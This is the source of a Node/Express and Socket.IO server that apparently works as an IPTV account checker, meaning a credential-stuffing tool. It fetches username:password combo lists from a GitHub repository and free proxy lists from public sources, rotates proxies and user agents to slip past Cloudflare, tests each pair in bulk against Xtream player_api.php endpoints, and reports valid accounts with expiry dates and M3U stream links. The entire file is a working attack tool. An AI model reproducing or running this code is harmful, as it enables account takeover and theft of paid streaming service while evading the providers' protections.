import express from "express";
import path from "path";
import { createServer as createViteServer } from "vite";
import { Server, Socket } from "socket.io";
import http from "http";
import axios, { AxiosRequestConfig } from "axios";
import { HttpsProxyAgent } from "https-proxy-agent";
import { SocksProxyAgent } from "socks-proxy-agent";

// Common User Agents for rotation
const USER_AGENTS = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
  "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200/2.1.0 Safari/533.3",
];

const DEFAULT_UA = USER_AGENTS[0];
const REQUEST_TIMEOUT = 8000;
const EXTRA_INFO_TIMEOUT = 5000;
const FETCH_ASSET_TIMEOUT = 8000;
const MAX_THREADS = 1000;

type ProxyType = "http" | "socks4" | "socks5" | "none";

interface CheckRequest {
  portal: string;
  combo: string[];
  threads: number;
  proxies: string[];
  proxyType: ProxyType;
  bypassCloudflare: boolean;
  randomUserAgent: boolean;
}

interface HitResult {
  username: string;
  password: string;
  created?: string;
  expiry?: string;
  daysLeft?: number;
  activeCons?: string;
  maxCons?: string;
  status?: string;
  liveCount?: number;
  vodCount?: number;
  seriesCount?: number;
  timezone?: string;
  m3uLink?: string;
}

// Track running sessions per-socket so we can stop cleanly
const runningSessions = new Map<string, { aborted: boolean }>();

function parsePortal(raw: string): { host: string; protocol: "http" | "https" } | null {
  if (!raw) return null;
  const trimmed = raw.trim();
  let protocol: "http" | "https" = "http";
  let rest = trimmed;
  const protoMatch = trimmed.match(/^(https?):\/\//i);
  if (protoMatch) {
    protocol = protoMatch[1].toLowerCase() as "http" | "https";
    rest = trimmed.slice(protoMatch[0].length);
  }
  const host = rest.split("/")[0].trim();
  if (!host) return null;
  return { host, protocol };
}

function buildProxyUrl(raw: string, fallbackType: ProxyType): string | null {
  if (!raw) return null;
  const trimmed = raw.trim();
  if (!trimmed) return null;
  if (/^(https?|socks4|socks5):\/\//i.test(trimmed)) return trimmed;
  const scheme = fallbackType && fallbackType !== "none" ? fallbackType : "http";
  return `${scheme}://${trimmed}`;
}

function getAgent(proxyStr: string | null, fallbackType: ProxyType) {
  const url = buildProxyUrl(proxyStr ?? "", fallbackType);
  if (!url) return null;
  try {
    if (url.startsWith("socks")) return new SocksProxyAgent(url);
    return new HttpsProxyAgent(url);
  } catch {
    return null;
  }
}

function isCloudflareBlocked(status: number, headers: Record<string, any>, body: any): boolean {
  if (status !== 403 && status !== 503 && status !== 429) return false;
  const serverHeader = String(headers["server"] || "").toLowerCase();
  const cfRay = headers["cf-ray"];
  const bodyStr = typeof body === "string" ? body : "";
  return (
    !!cfRay ||
    serverHeader.includes("cloudflare") ||
    bodyStr.includes("Cloudflare") ||
    bodyStr.includes("cf-browser-verification") ||
    bodyStr.includes("Just a moment")
  );
}

async function startServer() {
  const app = express();
  const httpServer = http.createServer(app);
  const io = new Server(httpServer, { maxHttpBufferSize: 1e8 });
  const PORT = Number(process.env.PORT) || 5173;

  app.use(express.json({ limit: "50mb" }));

  app.get("/api/health", (_req, res) => {
    res.json({ ok: true, sessions: runningSessions.size });
  });

  app.get("/api/fetch-assets", async (req, res) => {
    const { type } = req.query;

    try {
      if (type === "combo") {
        const repoPath = "gamba3/Combo-SILENTGHOST-STORAGE";
        const branches = ["main", "master"];
        const possibleFiles = ["Combo.txt", "combo.txt", "Combo_SILENTGHOST.txt", "LIST.txt"];

        let comboData = "";

        for (const branch of branches) {
          for (const file of possibleFiles) {
            try {
              const url = `https://raw.githubusercontent.com/${repoPath}/${branch}/${file}`;
              const response = await axios.get(url, { timeout: FETCH_ASSET_TIMEOUT });
              if (response.data && typeof response.data === "string" && response.data.includes(":")) {
                comboData = response.data;
                break;
              }
            } catch {}
          }
          if (comboData) break;
        }

        if (!comboData) {
          try {
            const apiRes = await axios.get(`https://api.github.com/repos/${repoPath}/contents/`, {
              timeout: FETCH_ASSET_TIMEOUT,
              headers: { "User-Agent": "Axios-Scanner" },
            });
            if (Array.isArray(apiRes.data)) {
              const txtFiles = apiRes.data.filter(
                (f: any) => f.name?.toLowerCase().endsWith(".txt") && f.type === "file"
              );
              for (const file of txtFiles) {
                try {
                  const response = await axios.get(file.download_url, { timeout: FETCH_ASSET_TIMEOUT });
                  if (response.data && typeof response.data === "string" && response.data.includes(":")) {
                    comboData = response.data;
                    break;
                  }
                } catch {}
              }
            }
          } catch {}
        }

        if (!comboData) {
          return res
            .status(404)
            .json({ error: "Could not find valid combo list in repository. Please verify the file name or upload manually." });
        }
        return res.send(comboData);
      }

      if (type === "proxy") {
        const proxyUrls = [
          "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all&simplified=true",
          "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4&timeout=10000&country=all",
          "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all",
          "https://github.com/TheSpeedX/PROXY-List/raw/master/http.txt",
          "https://github.com/TheSpeedX/PROXY-List/raw/master/socks4.txt",
          "https://github.com/TheSpeedX/PROXY-List/raw/master/socks5.txt",
        ];

        const results = await Promise.allSettled(
          proxyUrls.map((url) => axios.get(url, { timeout: 10000 }))
        );
        const allProxies: string[] = [];

        results.forEach((r) => {
          if (r.status === "fulfilled" && r.value.data) {
            const lines = String(r.value.data)
              .split(/\r?\n/)
              .map((l) => l.trim())
              .filter((l) => l.length > 0 && /\d+\.\d+\.\d+\.\d+:\d+/.test(l));
            allProxies.push(...lines);
          }
        });

        const uniqueProxies = Array.from(new Set(allProxies));
        if (uniqueProxies.length === 0) {
          return res.status(404).json({ error: "Failed to fetch any proxies from online sources." });
        }
        return res.send(uniqueProxies.join("\n"));
      }

      res.status(400).json({ error: "Invalid asset type" });
    } catch (error: any) {
      res.status(500).json({ error: error.message || "Unknown error" });
    }
  });

  io.on("connection", (socket: Socket) => {
    console.log(`[SOCKET] Client connected: ${socket.id}`);

    socket.on("stopCheck", () => {
      const session = runningSessions.get(socket.id);
      if (session) {
        session.aborted = true;
        console.log(`[ENGINE] Stop requested for ${socket.id}`);
      }
    });

    socket.on("disconnect", () => {
      const session = runningSessions.get(socket.id);
      if (session) session.aborted = true;
      runningSessions.delete(socket.id);
      console.log(`[SOCKET] Client disconnected: ${socket.id}`);
    });

    socket.on("startCheck", async (data: CheckRequest) => {
      // Prevent overlapping sessions on the same socket
      if (runningSessions.has(socket.id)) {
        socket.emit("finished", { hits: 0, bad: 0, proxyErrors: 0, error: "A session is already running" });
        return;
      }

      const session = { aborted: false };
      runningSessions.set(socket.id, session);

      try {
        const {
          portal,
          combo,
          threads,
          proxies,
          proxyType = "none",
          bypassCloudflare,
          randomUserAgent,
        } = data || ({} as CheckRequest);

        const parsed = parsePortal(portal || "");
        if (!parsed) {
          socket.emit("finished", { hits: 0, bad: 0, proxyErrors: 0, error: "Invalid portal URL" });
          return;
        }
        if (!Array.isArray(combo) || combo.length === 0) {
          socket.emit("finished", { hits: 0, bad: 0, proxyErrors: 0, error: "Empty combo list" });
          return;
        }

        const { host, protocol } = parsed;
        const baseUrl = `${protocol}://${host}`;

        console.log(
          `[ENGINE] Scan ${baseUrl} | threads=${threads} | combo=${combo.length} | proxies=${proxies?.length || 0} | type=${proxyType}`
        );

        let processed = 0;
        let hits = 0;
        let bad = 0;
        let proxyErrors = 0;
        const startTime = Date.now();

        let currentIdx = 0;
        const getNextPair = () => {
          if (session.aborted) return null;
          if (currentIdx >= combo.length) return null;
          return combo[currentIdx++];
        };

        const proxyList = Array.isArray(proxies) ? [...proxies] : [];
        let proxyIdx = 0;
        const getNextProxy = () => {
          if (proxyList.length === 0) return null;
          const p = proxyList[proxyIdx % proxyList.length];
          proxyIdx++;
          return p;
        };

        const emitProgress = () => {
          const elapsed = (Date.now() - startTime) / 1000;
          const cpm = elapsed > 0 ? Math.round((processed / elapsed) * 60) : 0;
          socket.emit("progress", {
            processed,
            total: combo.length,
            hits,
            bad,
            cpm,
            percent: Math.round((processed / combo.length) * 100),
            proxyErrors,
          });
        };

        const worker = async () => {
          while (!session.aborted) {
            const pair = getNextPair();
            if (!pair) break;

            const parts = pair.split(":");
            if (parts.length < 2) {
              processed++;
              bad++;
              continue;
            }

            const user = parts[0].trim();
            const pass = parts.slice(1).join(":").trim();
            if (!user || !pass) {
              processed++;
              bad++;
              continue;
            }

            const encUser = encodeURIComponent(user);
            const encPass = encodeURIComponent(pass);

            const maxRetries = proxyList.length > 0 ? 2 : 1;
            let attempt = 0;
            let done = false;

            while (attempt < maxRetries && !done && !session.aborted) {
              const currentProxy = getNextProxy();
              const agent = getAgent(currentProxy, proxyType);
              const userAgent = randomUserAgent
                ? USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)]
                : DEFAULT_UA;

              const reqConfig: AxiosRequestConfig = {
                headers: {
                  "User-Agent": userAgent,
                  Accept: "*/*",
                  "X-Requested-With": "com.stb.emu.pro",
                  Connection: "Keep-Alive",
                },
                httpsAgent: agent ?? undefined,
                httpAgent: agent ?? undefined,
                timeout: REQUEST_TIMEOUT,
                validateStatus: (s) => s < 500,
              };

              try {
                const testUrl = `${baseUrl}/player_api.php?username=${encUser}&password=${encPass}`;
                const response = await axios.get(testUrl, reqConfig);

                if (isCloudflareBlocked(response.status, response.headers as any, response.data)) {
                  if (bypassCloudflare) {
                    // Treat as proxy/network failure -> retry with next proxy
                    throw new Error("Cloudflare Block");
                  } else {
                    bad++;
                    proxyErrors++;
                    done = true;
                    break;
                  }
                }

                const info = response.data;
                if (info && info.user_info && info.user_info.status === "Active") {
                  const userInfo = info.user_info;
                  const result: HitResult = {
                    username: user,
                    password: pass,
                    activeCons: String(userInfo.active_cons ?? "0"),
                    maxCons: String(userInfo.max_connections ?? "0"),
                    status: userInfo.status,
                    timezone: info.server_info?.timezone,
                    m3uLink: `${baseUrl}/get.php?username=${encUser}&password=${encPass}&type=m3u_plus`,
                  };

                  if (userInfo.exp_date && userInfo.exp_date !== "null" && userInfo.exp_date !== "0") {
                    const expTS = parseInt(userInfo.exp_date) * 1000;
                    if (!Number.isNaN(expTS)) {
                      result.expiry = new Date(expTS).toLocaleDateString();
                      result.daysLeft = Math.ceil((expTS - Date.now()) / (1000 * 60 * 60 * 24));
                    }
                  } else {
                    result.expiry = "Unlimited";
                    result.daysLeft = 9999;
                  }

                  hits++;
                  socket.emit("hit", result);

                  // Fetch extra info in background (best-effort)
                  (async () => {
                    try {
                      const opts: AxiosRequestConfig = {
                        ...reqConfig,
                        timeout: EXTRA_INFO_TIMEOUT,
                      };
                      const [live, vod, series] = await Promise.allSettled([
                        axios.get(
                          `${baseUrl}/player_api.php?username=${encUser}&password=${encPass}&action=get_live_streams`,
                          opts
                        ),
                        axios.get(
                          `${baseUrl}/player_api.php?username=${encUser}&password=${encPass}&action=get_vod_streams`,
                          opts
                        ),
                        axios.get(
                          `${baseUrl}/player_api.php?username=${encUser}&password=${encPass}&action=get_series`,
                          opts
                        ),
                      ]);

                      const updated: HitResult = { ...result };
                      if (live.status === "fulfilled")
                        updated.liveCount = Array.isArray(live.value.data) ? live.value.data.length : 0;
                      if (vod.status === "fulfilled")
                        updated.vodCount = Array.isArray(vod.value.data) ? vod.value.data.length : 0;
                      if (series.status === "fulfilled")
                        updated.seriesCount = Array.isArray(series.value.data) ? series.value.data.length : 0;

                      if (!session.aborted && socket.connected) socket.emit("hitUpdate", updated);
                    } catch {}
                  })();

                  done = true;
                } else {
                  bad++;
                  done = true;
                }
              } catch (error: any) {
                attempt++;
                const code = error?.code || "";
                const msg = String(error?.message || "");
                const isNetErr =
                  code === "ECONNREFUSED" ||
                  code === "ECONNRESET" ||
                  code === "ETIMEDOUT" ||
                  code === "EAI_AGAIN" ||
                  code === "ENOTFOUND" ||
                  msg.includes("Cloudflare") ||
                  msg.includes("timeout");

                if (attempt >= maxRetries) {
                  bad++;
                  if (isNetErr) proxyErrors++;
                  done = true;
                }
              }
            }

            processed++;
            if (processed % 10 === 0 || combo.length < 100 || processed === combo.length) {
              if (socket.connected) emitProgress();
            }
          }
        };

        const threadCount = Math.max(1, Math.min(threads || 1, combo.length, MAX_THREADS));
        const workers = new Array(threadCount).fill(null).map(() => worker());
        await Promise.all(workers);

        if (socket.connected) {
          emitProgress();
          socket.emit("finished", {
            hits,
            bad,
            proxyErrors,
            aborted: session.aborted,
          });
        }
        console.log(
          `[ENGINE] Done ${baseUrl} | hits=${hits} bad=${bad} proxyErr=${proxyErrors} aborted=${session.aborted}`
        );
      } catch (err: any) {
        if (socket.connected) {
          socket.emit("finished", { hits: 0, bad: 0, proxyErrors: 0, error: err?.message || "Unknown server error" });
        }
        console.error("[ENGINE] Fatal error:", err);
      } finally {
        runningSessions.delete(socket.id);
      }
    });
  });

  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), "dist");
    app.use(express.static(distPath));
    app.get("*", (_req, res) => {
      res.sendFile(path.join(distPath, "index.html"));
    });
  }

  httpServer.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on http://localhost:${PORT}`);
  });
}

startServer().catch((e) => {
  console.error("Failed to start server:", e);
  process.exit(1);
});
